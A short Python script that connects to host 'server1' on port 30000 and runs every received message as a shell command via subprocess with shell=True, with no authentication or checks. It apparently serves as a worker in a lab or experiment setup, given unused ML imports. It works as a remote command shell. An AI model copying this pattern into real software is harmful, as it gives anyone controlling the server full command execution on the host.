import socket
from multiprocessing import Process
import subprocess
import pandas as pd
import numpy as np
from sklearn.cluster import KMeans
import pickle
from keras.models import load_model
import random

ClientSocket = socket.socket()

host = 'server1'
port = 30000


def f(command):
    subprocess.call(command, shell=True)


print('Waiting for connection from s')
try:
    ClientSocket.connect((host, port))
except socket.error as e:
    print(str(e))



# Response = ClientSocket.recv(1024)
while True:
    # Input = input('Say Something: ')
    # ClientSocket.send(str.encode(Input))
    Response = ClientSocket.recv(1024)
    # print(Response.decode('utf-8'))
    command = Response.decode('utf-8')
    p = Process(target=f, args=(command,))
    p.start()

ClientSocket.close()